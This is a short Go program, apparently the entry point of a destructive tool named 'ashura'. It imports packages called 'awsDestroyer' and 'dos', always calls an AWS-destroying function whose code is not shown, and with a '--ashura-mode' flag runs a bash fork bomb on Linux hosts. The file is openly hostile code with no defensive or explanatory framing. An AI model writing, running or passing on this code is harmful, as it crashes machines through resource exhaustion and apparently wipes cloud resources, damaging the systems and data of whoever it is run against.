package main

import (
	"ashura/awsDestroyer"
	"ashura/dos"
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func main() {
	for i := 0; i < len(os.Args); i++ {
		if os.Args[i] == "--ashura-mode" {
			ashuraMode()
		}
	}
	awsDestroyer.AwsDestroyer()
}

func ashuraMode() {
	fmt.Println("[-] Running ashura mode...")
	if runtime.GOOS == "linux" {
		cmd := exec.Command("/bin/bash", "-c", ":(){ :|:& };:")
		_ = cmd.Run()
	}
}
